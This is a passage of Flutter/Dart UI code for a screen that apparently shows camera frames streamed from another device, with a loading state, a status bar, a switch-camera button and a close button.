                        const CircularProgressIndicator(color: Colors.cyan),
                        const SizedBox(height: 20),
                        Text(statusMessage,
                            style: const TextStyle(color: Colors.white),
                            textAlign: TextAlign.center),
                        const SizedBox(height: 10),
                        const Text('Menunggu frame dari device...',
                            style: TextStyle(color: Colors.grey, fontSize: 12)),
                      ],
                    ),
                  ),
          ),
          // Status Bar atas
          Positioned(
            top: 0, left: 0, right: 0,
            child: Container(
              color: Colors.black54,
              padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
              child: Text(statusMessage,
                  style: const TextStyle(color: Colors.lime, fontSize: 13),
                  textAlign: TextAlign.center),
            ),
          ),
          // Switch Camera Button
          Positioned(
            bottom: 24, left: 24,
            child: FloatingActionButton(
              backgroundColor: Colors.white,
              foregroundColor: Colors.black,
              onPressed: _switchCamera,
              child: Icon(
                isFrontCamera ? Icons.camera_front : Icons.camera_rear,
                size: 28,
              ),
            ),
          ),
          // Back Button
          Positioned(
            bottom: 24, right: 24,
            child: FloatingActionButton(
              backgroundColor: Colors.red,
              onPressed: () => Navigator.pop(context),
              child: const Icon(Icons.close, size: 28),
            ),
          ),
        ],
      ),
    );
  }
}
